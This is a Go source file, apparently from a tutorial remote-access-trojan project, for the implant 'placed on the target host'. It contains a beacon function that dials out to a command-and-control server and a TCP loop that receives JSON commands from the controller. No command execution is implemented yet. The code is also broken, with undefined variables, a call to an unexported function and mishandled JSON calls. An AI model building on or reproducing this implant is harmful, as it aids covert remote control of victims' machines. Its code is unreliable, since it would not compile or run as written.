/*/
This is the file that will be compiled into the binary
	that gets placed on the target host
/*/
// we have to name the module after the folder it's in
package target_binary

// import the libraries we need
import (
	"bufio"
	"encoding/json"
	"fmt"

	//"go_rat"

	/*/
	IMPORTING MODULES FROM GOMODCACHE DIRECTORY
		A useful way to make multiple binaries with common code
		- depends on the folder structure and module naming
		- gomodcache is also, invisibly, the pkg directory in the workspace


	/*/
	"go_rat/pkg/go_rat"
	"net"
	"strings"
)

//
// This function of for extracting messages sent in json into the
// Command type
// This gets placed in a loop to handle net.Conn type
// containing json AFTER AUTH
func json_extract(text string, command_struct go_rat.Command) {
	/*/
		use Unmarshal if we expect our data to be pure JSON
		second parameter is the address of the struct
		we want to store our arsed data in
	/*/
	go_rat.error_printer("wat")
	json.Unmarshal([]byte(text), &command_struct)

}

/*/
Function for packing up a string to send down the wire to the command and control
/*/
func json_pack(json_string string, outgoing_message go_rat.OutgoingMessage) []byte {
	encoded_json, err := json.Marshal(json_string)
	if err != nil {
		error_printer(err, "[-] Problem with JSON packing function")
	}
	return encoded_json
}

// Beacon
// makes requests outside the network to get to the C&C
// ONLY used for reaching out
func Bacon() {
	go_rat.PHONEHOME_TCP.IP = net.IP(remote_tcpaddr)
	net.DialTCP("tcp", &local_tcpaddr_LAN, &PHONEHOME_TCP)
}

/*
function to hash a string to compare against the hardcoded password
 never hardcode a password in plaintext
 we use the strongest we can and a good password...

 For the porpoises of this tutorial, we use a weak password.
*/

var new_command_for_q go_rat.Command

// function to provide outbound connections via threading
//-----------------Local IP---------Remote IP---------PORT-------
func tcp_outbound(laddr net.TCPAddr, raddr net.TCPAddr, port int8) {
	// the network functions return two objects
	// a connection
	// and an error
	connection, err := net.DialTCP("tcp", &laddr, &raddr)
	//generic error printing
	// if error isnt empty/null/nothingness
	if err != nil {
		// print the error
		error_printer(err, "[-] Error: TCP Connection Failed")
		return
	}
	// if there was no error, continue to the control loop
	// will be basis of control flow
	// we Assume all communication from the controller to be in json only
	// we are only sending encoded json so we should only react to encoded json
	for {
		netData, error := bufio.NewReader(connection).ReadString('\n')
		// again with the error checking, what are we? Hackers?
		if error != nil {
			fmt.Println(error)
			return
		}
		json_extract(netData, new_command_for_q)
		// stops server if "STOP" Command is sent
		// TODO: JSONIFY THIS
		if strings.TrimSpace(string(netData)) == "STOP" {
			fmt.Println("Exiting TCP server!")
			return
		}
		//sending wat!?!?
		//connection.Write("asdf")
	}
}

/*
control flow for network operation with tcp protocol
this function will contain the logic to spawn threads
of the following functions

*/
func tcp_network_io() {

	//generic error printing
	//if err != nil {
	//	fmt.Println(err)
	//	return
	//}

}
